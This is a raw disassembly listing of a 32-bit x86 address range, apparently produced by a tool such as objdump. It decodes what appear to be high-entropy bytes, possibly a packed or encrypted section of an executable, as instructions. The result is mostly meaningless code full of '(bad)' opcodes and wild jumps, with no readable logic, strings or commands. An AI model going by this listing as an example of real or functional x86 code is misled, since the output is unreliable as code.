  404f6b:	mov    DWORD PTR [ebp-0x729b03],edi
  404f71:	jmp    0xa2a83c5d
  404f76:	push   esp
  404f77:	inc    esi
  404f78:	add    BYTE PTR [esi],dh
  404f7a:	mov    dh,0xda
  404f7c:	(bad)  
  404f7d:	test   BYTE PTR cs:[esi+0x6f3510d],bl
  404f84:	or     ebp,DWORD PTR [ecx]
  404f86:	inc    DWORD PTR [eax]
  404f88:	lea    edi,[ebx+eiz*1-0x74]
  404f8c:	dec    DWORD PTR [esi]
	...
  404f9e:	add    BYTE PTR [eax],al
  404fa0:	add    DWORD PTR [esi-0x175ff30],ecx
  404fa6:	fidiv  DWORD PTR [ebp+0x1d]
  404fa9:	test   BYTE PTR [ebp-0x86e1d0],al
  404faf:	push   eax
  404fb0:	icebp  
  404fb1:	mov    ah,0xa7
  404fb3:	add    BYTE PTR [ecx],cl
  404fb5:	jmp    0x404fda
  404fb7:	lea    edx,[edx+esi*4-0x2de10002]
  404fbe:	(bad)  
  404fbf:	jne    0x404fd2
  404fc1:	jno    0x405008
  404fc3:	shr    DWORD PTR [esi],cl
  404fc5:	jns    0x404fc6
  404fc7:	jne    0x404f76
  404fc9:	js     0x405040
  404fcb:	or     BYTE PTR [ecx-0x71002c86],dh
  404fd1:	fcomp  DWORD PTR [edx-0x37]
  404fd4:	mov    edi,edi
  404fd6:	call   DWORD PTR [edx+eax*2+0x67]
  404fda:	add    esp,0xffff7071
  404fe0:	sbb    al,0x3e
  404fe2:	cld    
  404fe3:	push   eax
  404fe4:	outs   dx,BYTE PTR ds:[esi]
  404fe5:	out    dx,al
  404fe6:	or     edi,edi
  404fe8:	fs out 0x28,eax
  404feb:	inc    ecx
  404fec:	cdq    
  404fed:	jo     0x404fa9
  404fef:	test   al,0x89
  404ff1:	or     BYTE PTR [ebx],cl
  404ff3:	rcr    BYTE PTR [esi-0x66ff1881],0x8
  404ffa:	mov    DWORD PTR [ebp+0x21],0x89000003
  405001:	rol    DWORD PTR [ebp-0xc],0x0
	...
  405015:	add    BYTE PTR [esi],ch
  405017:	add    BYTE PTR [eax],al
  405019:	add    BYTE PTR [ebx+0x8],al
  40501c:	push   0x0
  40501e:	int3   
  40501f:	jge    0x40500d
  405021:	test   DWORD PTR [esi],0x496a5078
  405027:	xchg   DWORD PTR [ebp-0xc],eax
  40502a:	mov    DWORD PTR [edi-0x130f0b7b],eax
  405030:	xchg   edx,eax
  405031:	jmp    DWORD PTR [eax+0x37f818fc]
  405037:	or     ecx,DWORD PTR [edi+0x43689e8]
  40503d:	add    bl,bh
  40503f:	fst    QWORD PTR [edi]
  405041:	add    eax,0x44309
  405046:	lock and BYTE PTR [eax-0x14],dl
  40504a:	pop    es
  40504b:	lods   eax,DWORD PTR ds:[esi]
  40504c:	xchg   edx,eax
  40504d:	add    DWORD PTR [ebx+eiz*4-0x7a],edi
  405051:	mov    ebp,0xff92b50c
  405056:	out    dx,eax
  405057:	leave  
  405058:	or     bh,bh
  40505a:	xor    eax,0x58b69ec6
  40505f:	nop
  405060:	rol    DWORD PTR [eax-0x10],cl
  405063:	sub    cl,BYTE PTR [eax-0x6d9b200c]
  405069:	push   eax
  40506a:	fcomp  DWORD PTR [ecx]
  40506c:	pop    ebx
  40506d:	add    al,dh
  40506f:	test   al,0xc3
  405071:	je     0x4050b4
  405073:	sub    ecx,DWORD PTR [eax-0x6d7b4018]
  405079:	push   eax
	...
  40508a:	add    BYTE PTR [eax],al
  40508c:	jge    0x4050b0
  40508e:	xchg   edi,eax
  40508f:	mul    DWORD PTR [edi+0x25ff3314]
  405095:	stos   BYTE PTR es:[edi],al
  405096:	xchg   edx,eax
  405097:	xor    eax,0x44f705
  40509c:	cwde   
  40509d:	xor    eax,0xa887ffab
  4050a2:	ret    
  4050a3:	je     0x4050c6
  4050a5:	daa    
  4050a6:	mov    al,dh
  4050a8:	jg     0x4050ee
  4050aa:	xchg   edx,eax
  4050ab:	push   0xbea29df1
  4050b0:	addr16 dec edx
  4050b2:	sti    
  4050b3:	out    0xb2,eax
  4050b5:	out    dx,eax
  4050b6:	xchg   ecx,eax
  4050b7:	push   DWORD PTR [ebx+0x6]
  4050ba:	fs lahf 
  4050bc:	inc    edi
  4050bd:	mov    ebx,DWORD PTR [esi]
  4050bf:	add    al,0xbd
  4050c1:	cli    
  4050c2:	add    BYTE PTR [ebx],0x3f
  4050c5:	adc    ecx,esp
  4050c7:	fwait
  4050c8:	pop    es
  4050c9:	mov    ecx,0x1b9206
  4050ce:	xchg   ebx,eax
  4050cf:	add    al,0x27
  4050d1:	adc    ecx,esp
  4050d3:	fwait
  4050d4:	sar    DWORD PTR [eax+0x511791ee],cl
  4050da:	rcr    DWORD PTR [ecx+0x57de8b0f],1
  4050e0:	add    BYTE PTR [ebx+0x10ff91d6],dl
  4050e6:	loope  0x405083
  4050e8:	lods   eax,DWORD PTR ds:[esi]
  4050e9:	mov    eax,0x54ef91c6
  4050ee:	mov    ecx,0x99
	...
  4050ff:	add    BYTE PTR [eax],al
  405101:	add    bh,ah
  405103:	mov    al,cl
  405105:	or     eax,0x91ae8ac5
  40510a:	sub    eax,0xcedc908f
  40510f:	mov    bl,BYTE PTR [esi-0x7e74c26f]
  405115:	(bad)  
  405116:	xchg   edi,eax
  405117:	pop    es
  405118:	jmp    0xe94003d7
  40511d:	ss jnp 0x4050bb
  405120:	push   0x76928cc8
  405125:	xchg   ecx,eax
  405126:	ins    DWORD PTR es:[edi],dx
  405127:	inc    esp
  405128:	ins    DWORD PTR es:[edi],dx
  405129:	xor    al,0x97
  40512b:	adc    al,0xf5
  40512d:	nop
  40512e:	lds    ebx,FWORD PTR [ebx]
  405130:	adc    BYTE PTR [ebx-0x10],al
  405133:	sahf   
  405134:	test   DWORD PTR [ecx-0x10],ebp
  405137:	push   es
  405138:	loop   0x4050fd
  40513a:	out    0x83,eax
  40513c:	call   0x6847:0x2606f002
  405143:	pop    es
  405144:	add    cl,ch
  405146:	repz push es
  405148:	(bad)  
  405149:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40514a:	jg     0x4050d6
  40514c:	pop    es
  40514d:	jmp    0x93406e45
  405152:	repz sbb al,0x0
  405155:	xor    ebx,0x7b
  405158:	inc    ebp
  405159:	adc    eax,0xfd857bfc
  40515e:	mov    BYTE PTR [edx+0x148099ff],cl
  405164:	clc    
  405165:	test   BYTE PTR [eax],0x0
	...
  405178:	push   es
  405179:	mov    ebp,eax
  40517b:	outs   dx,DWORD PTR ds:[esi]
  40517c:	mov    BYTE PTR [esi],al
  40517e:	add    dl,dh
  405180:	xor    edx,DWORD PTR [ebx]
  405182:	add    eax,0x709d0
  405187:	jmp    0x2868fa67
  40518c:	in     al,dx
  40518d:	mov    DWORD PTR [ebp-0xb],esi
  405190:	mov    esp,DWORD PTR [edi-0x28]
  405193:	mov    esi,0x998b3680
  405198:	pop    esi
  405199:	test   ah,dh
  40519b:	mov    dh,0x80
  40519d:	mov    DWORD PTR [eax+0x3b],edx
  4051a0:	ins    BYTE PTR es:[edi],dx
  4051a1:	ja     0x40517b
  4051a3:	sahf   
  4051a4:	pusha  
  4051a5:	jg     0x40512c
  4051a7:	cdq    
  4051a8:	pop    eax
  4051a9:	mov    edi,edi
  4051ab:	or     DWORD PTR [eax+0xd86ffb2],0xc3e26807
  4051b5:	inc    esi
  4051b6:	add    BYTE PTR [esi+0x46],dh
  4051b9:	xchg   edi,eax
  4051ba:	imul   DWORD PTR [esi-0x80]
  4051bd:	mov    DWORD PTR ds:0x46aad4,esi
  4051c3:	push   ecx
  4051c4:	pop    eax
  4051c5:	mov    cl,0xff
  4051c7:	push   esi
  4051c8:	cli    
  4051c9:	and    esp,0x56
  4051cc:	pusha  
  4051cd:	mov    DWORD PTR [edx+0x0],ebp
  4051d0:	pop    ecx
  4051d1:	in     eax,dx
  4051d2:	and    esi,DWORD PTR [eax]
  4051d4:	cwde   
  4051d5:	add    eax,0x6f19b5ff
  4051da:	(bad)  
  4051db:	inc    DWORD PTR [eax]
	...
  4051ed:	add    BYTE PTR [esi],al
  4051ef:	mov    cl,0x6c
  4051f1:	sub    DWORD PTR [eax-0x13617fb],ebx
  4051f7:	jbe    0x4051f8
  4051f9:	mov    esp,ecx
  4051fb:	imul   esi,edi,0xffebe6ff
  405201:	addr16 inc esp
  405203:	mov    ch,0x40
  405205:	add    BYTE PTR [esi],ah
  405207:	xor    esi,eax
  405209:	mul    DWORD PTR [esi]
  40520b:	jns    0x40520c
  40520d:	xor    eax,0x40ac94
  405212:	and    DWORD PTR ds:0xb26ffd7,ebp
  405218:	test   eax,ebp
  40521a:	push   ds
  40521b:	jns    0x40521c
  40521d:	and    DWORD PTR [esi+ebx*2-0x9],0xffffffff
  405222:	mov    dh,0x3
  405224:	je     0x40526f
  405226:	pop    edx
  405227:	ss in  al,dx
  405229:	mul    DWORD PTR [esi+0x9740078]
  40522f:	test   BYTE PTR [ebp-0x879118],bh
  405235:	add    ch,bl
  405237:	scas   eax,DWORD PTR es:[edi]
  405238:	addr16 add cl,cl
  40523b:	imul   edi,DWORD PTR [esi-0x18752301],0xff7889ee
  405245:	(bad)  
  405246:	fsub   QWORD PTR [esi-0x9]
  405249:	jmp    DWORD PTR [esi]
  40524b:	js     0x4052c2
  40524d:	or     BYTE PTR [ecx+0x45],dh
  405250:	sar    edi,1
	...
  405262:	add    BYTE PTR [eax],al
  405264:	push   ss
  405265:	js     0x40521c
  405267:	call   0x3fca8a
  40526c:	lock stos BYTE PTR es:[edi],al
  40526e:	sti    
  40526f:	out    0xbc,eax
  405271:	into   
  405272:	mov    ?,edi
  405274:	outs   dx,DWORD PTR ds:[esi]
  405275:	or     ebp,DWORD PTR [eax-0x71369809]
  40527b:	jne    0x405265
  40527d:	inc    ebp
  40527e:	out    0xd0,al
  405280:	push   edi
  405281:	(bad)  [esi-0x7116ab4b]
  405287:	call   FWORD PTR [eax-0x52]
  40528a:	mov    bh,0xff
  40528c:	aas    
  40528d:	icebp  
  40528e:	pop    eax
  40528f:	in     al,dx
  405290:	aas    
  405291:	stc    
  405292:	mov    gs,eax
  405294:	aad    0xe9
  405296:	mov    ?,edi
  405298:	daa    
  405299:	rcr    DWORD PTR [ebx-0x646ee009],cl
  40529f:	sbb    bh,BYTE PTR [ecx+ebx*4]
  4052a2:	mov    ?,edi
  4052a4:	inc    ebp
  4052a5:	scas   al,BYTE PTR es:[edi]
  4052a6:	xchg   esi,eax
  4052a7:	inc    DWORD PTR [edi]
  4052a9:	test   eax,0x7b080818
  4052ae:	(bad)  
  4052af:	push   edi
  4052b1:	mov    eax,0xc0e7f058
  4052b6:	mov    gs,eax
  4052b8:	icebp  
  4052b9:	jno    0x405249
  4052bb:	(bad)  
  4052bc:	(bad)  
  4052be:	mov    ebp,ecx
  4052c0:	xchg   esp,eax
  4052c1:	push   edi
  4052c2:	mov    ?,edi
  4052c4:	iret   
  4052c5:	jmp    0x0:0xe88f
	...
  4052d8:	add    BYTE PTR [eax],al
  4052da:	cmp    eax,DWORD PTR [eax+0x3]
  4052dd:	add    BYTE PTR [ecx+0x1cfffb5b],ch
  4052e3:	and    eax,0x81b4839f
  4052e8:	sbb    DWORD PTR [eax],eax
  4052ea:	sbb    bl,BYTE PTR [edi-0x7a178a72]
  4052f0:	repnz rcl BYTE PTR [edi-0x73ba83e8],1
  4052f7:	push   es
  4052f8:	sar    DWORD PTR [edx-0x29],1
  4052fb:	inc    ebp
  4052fc:	jmp    0x413f588f
  405301:	daa    
  405302:	jbe    0x40528b
  405304:	dec    esi
  405305:	sbb    ebx,DWORD PTR [edx+0x6703a7d7]
  40530b:	adc    ecx,esi
  40530d:	fwait
  40530e:	(bad)  
  40530f:	mov    BYTE PTR [esi],dh
  405311:	mov    cs,eax
  405313:	mov    esp,0x87f044fe
  405318:	pushf  
  405319:	sti    
  40531a:	dec    edi
  40531b:	retf   0x8e1b
  40531e:	aas    
  40531f:	push   ds
  405320:	sbb    ebx,esi
  405322:	mov    al,0x6
  405324:	push   cs
  405325:	sbb    al,bh
  405327:	sahf   
  405328:	(bad)  
  405329:	nop
  40532a:	daa    
  40532b:	xchg   esi,edi
  40532d:	pop    ss
  40532e:	sbb    al,0x87
  405330:	jl     0x40532d
  405332:	pxor   mm2,QWORD PTR [edi]
  405335:	mov    cs,WORD PTR [edi]
  405337:	mov    ebp,0x31f008ab
  40533c:	jb     0x4052de
	...
  40534e:	add    BYTE PTR [eax],al
  405350:	mov    BYTE PTR [esi],al
  405352:	jmp    0x54c789f3
  405357:	add    bh,ch
  405359:	cld    
  40535a:	lock fwait
  40535c:	push   esp
  40535d:	jl     0x40531d
  40535f:	lea    ebp,[ecx+0x3d03e149]
  405365:	xchg   edx,eax
  405366:	mov    ebp,0xe9134d81
  40536b:	cld    
  40536c:	jae    0x405397
  40536e:	call   0x1cc64376
  405373:	add    al,cl
  405375:	loope  0x405325
  405377:	lea    ebp,[edi+0x17a912]
  40537d:	out    dx,eax
  40537e:	sahf   
  40537f:	fdiv   QWORD PTR [eax]
  405381:	pop    es
  405382:	add    BYTE PTR [esi-0x1],dh
  405385:	adc    ch,al
  405387:	and    al,BYTE PTR [ebp-0x7a]
  40538a:	push   DWORD PTR [eax+0x2f]
  40538d:	adc    ebp,DWORD PTR [edx-0x17]
  405390:	fcmovnu st,st(5)
  405392:	das    
  405393:	test   al,0xf3
  405395:	out    dx,al
  405396:	popa   
  405397:	sbb    DWORD PTR [ebx+0x6fcff06],esi
  40539d:	xor    BYTE PTR [ecx-0x17],al
  4053a0:	jnp    0x40537f
  4053a2:	aad    0x36
  4053a4:	gs adc al,al
  4053a7:	mov    ch,0x5d
  4053a9:	(bad)  
  4053aa:	dec    edi
  4053ab:	fist   WORD PTR es:[edx]
  4053ae:	call   0xffc6d9e1
  4053b3:	mov    ecx,0x0
	...
  4053c4:	add    BYTE PTR [eax],al
  4053c6:	add    eax,DWORD PTR [esi-0x67741e8b]
  4053cc:	inc    DWORD PTR [esi]
  4053ce:	jne    0x40543f
  4053d0:	and    DWORD PTR [edx],ebx
  4053d2:	ins    DWORD PTR es:[edi],dx
  4053d3:	xchg   al,ch
  4053d5:	aad    0x60
  4053d7:	xchg   bh,bh
  4053d9:	xor    ebx,0xffffffee
  4053dc:	push   esi
  4053dd:	sbb    DWORD PTR [ebx+0x244b6806],esi
  4053e3:	(bad)  
  4053e4:	inc    DWORD PTR [eax-0xe]
  4053e7:	push   es
  4053e8:	add    BYTE PTR [ecx-0x75],ch
  4053eb:	and    al,0xd6
  4053ed:	(bad)  
  4053ee:	je     0x405401
  4053f0:	shl    BYTE PTR ds:0xb64fd5ce,0xfe
  4053f7:	adc    ch,al
  4053f9:	push   esi
  4053fa:	test   DWORD PTR [ebp-0x7a03c601],eax
  405400:	jne    0x4053f3
  405402:	pop    ebx
  405403:	(bad)  
  405405:	xchg   esi,eax
  405406:	outs   dx,BYTE PTR fs:[esi]
  405408:	jmp    0xe8c5d0c8
  40540d:	add    BYTE PTR [ebp-0x49],dh
  405410:	(bad)  
  405411:	inc    DWORD PTR [ebx]
  405413:	or     ebp,DWORD PTR [eax+0x57]
  405416:	pop    ecx
  405417:	enter  0x67ff,0x14
  40541b:	pop    edx
  40541c:	inc    eax
  40541d:	add    BYTE PTR [esi],cl
  40541f:	pop    ebp
  405420:	ins    BYTE PTR es:[edi],dx
  405421:	sub    DWORD PTR [eax+0x9],ecx
  405424:	call   0xffd3090e
  405429:	or     eax,DWORD PTR [eax]
	...
  40543b:	add    BYTE PTR [ecx],bl
  40543d:	push   ds
  40543e:	push   ds
  40543f:	push   eax
  405440:	mov    DWORD PTR [edx+0x33c10c75],edx
  405446:	(bad)  
  405447:	call   FWORD PTR [esi]
  405449:	cmp    dl,BYTE PTR [eax-0x1]
  40544c:	test   BYTE PTR [ecx-0x6cf1df19],al
  405452:	(bad)  
  405453:	call   0x400bf1
  405458:	icebp  
  405459:	(bad)  
  40545b:	(bad)  
  40545c:	(bad)  
  40545d:	pop    ds
  40545e:	add    BYTE PTR [eax-0x7a],ch
  405461:	pop    ecx
  405462:	inc    eax
  405463:	add    BYTE PTR [ecx+0x941308c],al
  405469:	and    DWORD PTR [edx],eax
  40546b:	add    BYTE PTR [ecx],bl
  40546d:	mov    eax,ebp
  40546f:	lods   eax,DWORD PTR ds:[esi]
  405470:	inc    esp
  405471:	xchg   ecx,eax
  405472:	dec    DWORD PTR [ebx]
  405474:	dec    ecx
  405475:	push   ss
  405476:	push   ds
  405477:	push   eax
  405478:	mov    ecx,0xb10c7591
  40547d:	imul   edx,ebp,0x503baeff
  405483:	jmp    DWORD PTR [ebx+eax*4]
  405486:	out    0xe8,eax
  405488:	lahf   
  405489:	nop
  40548a:	(bad)  
  40548b:	call   0x401191
  405490:	popa   
  405491:	sbb    al,0xd2
  405493:	call   FWORD PTR [esi+0x23]
  405496:	aaa    
  405497:	xor    al,dh
  405499:	cs add al,0xff
  40549c:	and    eax,0x59b62
	...
  4054b1:	add    BYTE PTR [esi+0x40508b8d],bh
  4054b7:	add    eax,0xb5880811
  4054bc:	mov    bh,bh
  4054be:	pop    DWORD PTR [esi-0x12782dcd]
  4054c4:	mov    dh,BYTE PTR [ebp-0x14]
  4054c7:	aad    0x3a
  4054c9:	shl    BYTE PTR [edi-0x23],cl
  4054cc:	mov    esp,0x306df8c2
  4054d1:	mov    edx,DWORD PTR [ecx+esi*8-0x41]
  4054d5:	hlt    
  4054d6:	retf   0x1d6d
  4054d9:	add    dl,BYTE PTR [edi-0x3d]
  4054dc:	sti    
  4054dd:	out    0xc1,eax
  4054df:	and    al,0x8b
  4054e1:	(bad)  
  4054e2:	jns    0x405497
  4054e4:	xchg   DWORD PTR [eax-0xb],ebp
  4054e7:	outs   dx,BYTE PTR ds:[esi]
  4054e8:	add    eax,DWORD PTR [eax]
  4054ea:	dec    eax
  4054eb:	mov    cl,0xb5
  4054ed:	jmp    FWORD PTR [edi]
  4054ef:	out    0x40,eax
  4054f1:	clc    
  4054f2:	cwde   
  4054f3:	jno    0x4054f9
  4054f5:	add    al,dh
  4054f7:	test   BYTE PTR [eax],dl
  4054f9:	clc    
  4054fa:	or     BYTE PTR [esi],ah
  4054fc:	addr16 add al,dh
  4054ff:	push   0x2adc74c3
  405504:	add    BYTE PTR [ecx],al
  405506:	lock ins DWORD PTR es:[edi],dx
  405508:	adc    cl,BYTE PTR ds:0xff8be2f7
  40550e:	gs data16 fwait
  405511:	mov    dh,ah
  405513:	dec    esp
  405514:	mov    ch,bl
	...
  405526:	add    BYTE PTR [eax],al
  405528:	call   0xc93865f1
  40552d:	mov    ecx,0xc7cfffb4
  405532:	(bad)  
  405534:	sub    al,0x7
  405536:	mov    edi,0x9dd6bf8a
  40553b:	adc    al,ch
  40553d:	outs   dx,BYTE PTR ds:[esi]
  40553e:	pop    es
  40553f:	mov    ch,BYTE PTR [edi-0x7011fc7d]
  405545:	cmp    bl,BYTE PTR [edi-0x56f06076]
  40554b:	paddb  mm5,mm6
  40554e:	sub    esp,edx
  405550:	xor    BYTE PTR [edi],al
  405552:	sbb    DWORD PTR [ecx+edi*4+0x208a6659],ebx
  405559:	test   ah,dl
  40555b:	sti    
  40555c:	(bad)  
  40555d:	rcl    DWORD PTR [esi-0x76],cl
  405560:	outs   dx,DWORD PTR ds:[esi]
  405561:	lock or DWORD PTR [ebp+edi*8-0x1475b9a4],ebx
  405569:	inc    esi
  40556a:	mov    ch,0xef
  40556c:	iret   
  40556d:	xbegin 0x411745b7
  405573:	pop    ebp
  405574:	sbb    eax,0x3f332683
  405579:	stc    
  40557a:	lock fwait
  40557c:	add    BYTE PTR [ebp+0x229a8a16],al
  405582:	add    DWORD PTR [ecx-0x1f97cc3],edx
  405588:	pop    edi
  405589:	cli    
  40558a:	aam    0x1b
	...
  40559c:	add    BYTE PTR [eax],al
  40559e:	mov    bl,0x36
  4055a0:	test   al,0x3
  4055a2:	mov    al,ds:0x7b0626e
  4055a7:	cmp    DWORD PTR [ecx],0xffffff89
  4055aa:	test   DWORD PTR [esi],ecx
  4055ac:	shl    ebx,1
  4055ae:	cmc    
  4055af:	adc    dh,0x1e
  4055b2:	lock out dx,al
  4055b4:	sbb    al,0xd4
  4055b6:	xor    BYTE PTR [edi],al
  4055b8:	push   ecx
  4055b9:	es and al,cl
  4055bc:	call   0x347349
  4055c1:	push   DWORD PTR [ebx]
  4055c3:	pop    es
  4055c4:	call   0xffc2d622
  4055c9:	cmp    DWORD PTR [ecx-0x4],ebp
  4055cc:	pop    es
  4055cd:	xchg   ecx,eax
  4055ce:	arpl   WORD PTR [edi+edi*8+0x68070e96],ax
  4055d5:	ss mov esp,0xd610ffc7
  4055db:	ss inc ecx
  4055dd:	jmp    0xc0ad924a
  4055e2:	xor    al,BYTE PTR [edi]
  4055e4:	call   0xffc2ade2
  4055e9:	repnz mov bl,0xfb
  4055ec:	adc    eax,0xff7ab770
  4055f1:	fdivr  QWORD PTR [edi-0x7e]
  4055f4:	jne    0x4055d7
  4055f6:	mov    edi,DWORD PTR [eax-0x7d96b903]
  4055fc:	jne    0x405633
  4055fe:	je     0x405641
  405600:	shl    DWORD PTR [esi],1
	...
  405612:	add    BYTE PTR [eax],al
  405614:	jns    0x405603
  405616:	inc    eax
  405618:	push   DWORD PTR [esi]
  40561a:	inc    ecx
  40561b:	jmp    0xa870e1fb
  405620:	repz xor DWORD PTR ds:0xffc74a84,0xff563900
  40562b:	push   es
  40562c:	in     al,0x81
  40562e:	jne    0x405621
  405630:	jnp    0x4055d9
  405632:	std    
  405633:	idiv   BYTE PTR [eax-0x13]
  405636:	inc    DWORD PTR [eax-0x16bec940]
  40563c:	fisttp DWORD PTR [ebx-0x7e13d7d0]
  405642:	xor    eax,0xffc6cb44
  405647:	rcr    al,0x55
  40564a:	inc    DWORD PTR [eax]
  40564c:	mov    dh,0x82
  40564e:	mov    edi,0x44fcbf74
  405653:	hlt    
  405654:	xchg   BYTE PTR [eax],dl
  405656:	hlt    
  405657:	(bad)  
  405658:	cld    
  405659:	and    bh,0x60
  40565c:	xchg   esp,eax
  40565d:	mov    ?,edi
  40565f:	(bad)  
  405660:	fcom   QWORD PTR [esi-0x71961218]
  405666:	jmp    FWORD PTR [edx-0x67]
  405669:	sbb    eax,0xac8304c
  40566e:	push   0xffc45962
  405673:	addr16 fwait
  405675:	add    eax,0x8000
	...
  40568a:	jno    0x40562a
  40568c:	sar    edi,cl
  40568e:	push   ss
  40568f:	push   DWORD PTR ss:[ebp-0x7f]
  405693:	popf   
  405694:	push   eax
  405695:	std    
  405696:	(bad)  
  405697:	mov    gs,WORD PTR [edx+0x0]
  40569a:	xor    DWORD PTR [esi],esi
  40569c:	xor    BYTE PTR [ecx+0x49],al
  40569f:	sbb    eax,0x5883062
  4056a4:	push   0x80055902
  4056a9:	call   0x401197
  4056ae:	inc    edx
  4056af:	inc    ebp
  4056b0:	je     0x4056c8
  4056b2:	rol    BYTE PTR [eax-0xc],0xff
  4056b6:	mov    WORD PTR [ecx-0x62ee8a01],ss
  4056bc:	adc    ebp,edi
  4056be:	test   BYTE PTR [esi-0x63e28a01],0x9e
  4056c5:	rol    BYTE PTR [esi],1
  4056c7:	mov    DWORD PTR [edx+0x0],ebp
  4056ca:	jno    0x405705
  4056cc:	xor    BYTE PTR [ecx+0x9],al
  4056cf:	sbb    eax,0xac83085
  4056d4:	push   0x36df002
  4056d9:	sbb    al,0x8e
  4056dc:	mov    bl,0xff
  4056de:	fistp  WORD PTR [esi]
  4056e0:	xchg   DWORD PTR [ebp-0x18],esi
  4056e3:	push   ebp
  4056e4:	add    eax,0x1ab9cffd
  4056e9:	add    BYTE PTR [eax+0x19],bl
  4056ec:	aam    0x40
	...
  4056fe:	add    BYTE PTR [eax],al
  405700:	lock adc eax,0x6e313081
  405706:	sbb    eax,DWORD PTR [edx]
  405708:	lock ins DWORD PTR es:[edi],dx
  40570a:	sub    eax,0x71
  40570d:	mov    ebp,0xadebff87
  405712:	adc    BYTE PTR [esi],dl
  405714:	imul   ebp,DWORD PTR [ebx],0x205ff90
  40571a:	xchg   DWORD PTR [ebp-0x8],esi
  40571d:	test   edx,eax
  40571f:	cld    
  405720:	jg     0x40570b
  405722:	xchg   BYTE PTR [ebp+0x7c],dh
  405725:	(bad)  
  405726:	shr    BYTE PTR ss:[edi-0x27],1
  40572a:	xchg   BYTE PTR [ebp+0x64],dh
  40572d:	rcl    DWORD PTR [eax],1
  40572f:	or     BYTE PTR [eax+0x2c],cl
  405732:	mov    ecx,0xc23757ff
  405737:	add    al,0xf0
  405739:	mov    ds:0x6dd8ec7a,al
  40573e:	add    ebp,edi
  405740:	jle    0x40576b
  405742:	adc    DWORD PTR [edi+esi*1],ecx
  405745:	fwait
  405746:	sti    
  405747:	out    0x7,eax
  405749:	sbb    al,0x87
  40574b:	(bad)  
  40574c:	cmp    DWORD PTR [esp+edi*8],ebp
  40574f:	inc    esp
  405751:	hlt    
  405752:	xchg   edi,eax
  405753:	sub    DWORD PTR [edx+edi*1],0x310fff86
  40575a:	cmp    DWORD PTR [eax+0x867106],0x3e906f0
	...
  405774:	add    BYTE PTR [eax],al
  405776:	imul   ecx,edx,0xffffffec
  405779:	cli    
  40577a:	scas   eax,DWORD PTR es:[edi]
  40577b:	cli    
  40577c:	jmp    0x405701
  40577e:	sub    BYTE PTR [edi],al
  405780:	push   esp
  405781:	add    ecx,ecx
  405783:	fucom  st(7)
  405785:	add    esi,eax
  405787:	jg     0x4057bd
  405789:	clc    
  40578a:	xlat   BYTE PTR ds:[ebx]
  40578b:	jo     0x405720
  40578d:	xchg   bh,al
  40578f:	or     ebp,DWORD PTR [ecx-0x4a1110f0]
  405795:	xlat   BYTE PTR ds:[ebx]
  405796:	xor    BYTE PTR [edi],al
  405798:	sahf   
  405799:	adc    ah,bh
  40579b:	outs   dx,BYTE PTR ds:[esi]
  40579c:	bound  esi,QWORD PTR [edx-0x77d8059]
  4057a2:	pop    ss
  4057a3:	pop    ebx
  4057a4:	aad    0x44
  4057a6:	lock jg 0x40579d
  4057a9:	not    DWORD PTR [edi-0x787965fe]
  4057af:	lea    esp,[ebx+ecx*2+0x7e]
  4057b3:	jg     0x40581b
  4057b5:	sbb    esi,DWORD PTR [esi+0x7d03e905]
  4057bb:	mov    DWORD PTR [ebx],ebp
  4057bd:	test   DWORD PTR [edi+0x7f],esp
  4057c0:	mov    ecx,0x464f649b
  4057c5:	xchg   BYTE PTR [ebp-0x77],ah
  4057c8:	sub    eax,DWORD PTR [ebp-0x796680b1]
  4057ce:	jge    0x40578e
  4057d0:	das    
  4057d1:	xchg   BYTE PTR [edi],bh
  4057d3:	outs   dx,BYTE PTR ds:[esi]
  4057d4:	fldenv [eax+esi*8+0x6]
  4057d8:	jo     0x40575a
	...
  4057ea:	add    BYTE PTR [eax],al
  4057ec:	ins    BYTE PTR es:[edi],dx
  4057ed:	adc    BYTE PTR [esi],0x86
  4057f0:	mov    al,0xf
  4057f2:	gs mov dh,al
  4057f5:	push   es
  4057f6:	jmp    0xff84d573
  4057fb:	test   DWORD PTR [edi],ecx
  4057fd:	ja     0x4057ff
  4057ff:	jmp    0x405804
  405801:	jg     0x405802
  405803:	jmp    0x2bcd41f7
  405808:	sbb    bh,cl
  40580a:	addr16 mov bl,0xc8
  40580d:	(bad)  
  40580e:	inc    eax
  405810:	fbld   TBYTE PTR [edi-0x41271700]
  405816:	jne    0x405804
  405818:	jp     0x4057d2
  40581a:	add    cl,ch
  40581c:	repz mov edx,DWORD PTR [ebp-0x819155]
  405823:	pop    esp
  405824:	xor    ch,BYTE PTR [ebx]
  405826:	push   eax
  405827:	adc    DWORD PTR [eax+0x2b],edi
  40582a:	inc    ecx
  40582b:	jmp    0xe9e0cfbb
  405830:	repz adc eax,eax
  405833:	adc    al,0x9f
  405835:	outs   dx,DWORD PTR ds:[esi]
  405836:	xchg   esp,eax
  405837:	jmp    0x9fa85f2f
  40583c:	lods   al,BYTE PTR ds:[esi]
  40583d:	(bad)  
  40583e:	push   DWORD PTR [ebp-0x9]
  405841:	or     ch,al
  405843:	jbe    0x405887
  405845:	jle    0x405846
  405847:	je     0x405850
  405849:	dec    ecx
  40584a:	(bad)  
  40584b:	pop    esi
  40584c:	jne    0x4057da
  40584e:	push   edx
  40584f:	add    eax,0x0
	...
  405860:	add    BYTE PTR [eax],al
  405862:	and    dl,bh
  405864:	out    0x12,eax
  405866:	mov    eax,ds:0x6c99ff7e
  40586b:	hlt    
  40586c:	setns  BYTE PTR [esp+esi*8+0x7]
  405871:	inc    ecx
  405872:	inc    edx
  405873:	jge    0x405874
  405875:	cs pop esp
  405877:	xor    eax,0x726d26cf
  40587c:	arpl   WORD PTR [edx+esi*4+0x2a],bp
  405880:	mov    DWORD PTR [eax+eax*8+0x7c],ebp
  405884:	dec    DWORD PTR [esi]
  405886:	cld    
  405887:	push   edi
  405888:	xor    BYTE PTR [eax],al
  40588a:	dec    eax
  40588b:	or     bh,bh
  40588d:	mov    ch,0xc5
  40588f:	test   bh,bh
  405891:	push   ecx
  405893:	retf   
  405894:	mov    al,ds:0xbf7f0900
  405899:	je     0x405862
  40589b:	sbb    bl,dh
  40589d:	sub    BYTE PTR [eax],bl
  40589f:	add    edi,edi
  4058a1:	jne    0x405870
  4058a3:	mov    eax,ds:0x82aed2a9
  4058a8:	push   DWORD PTR [ebp-0x7bab]
  4058ae:	jmp    0x7f134a4d
  4058b3:	adc    BYTE PTR [eax+0x50],0x4a
  4058b7:	add    eax,0x75d50010
  4058bc:	addr16 mov al,0xc9
  4058bf:	enter  0x4fff,0x71
  4058c3:	cli    
  4058c4:	mov    al,ds:0x0
	...
  4058d5:	add    BYTE PTR [eax],al
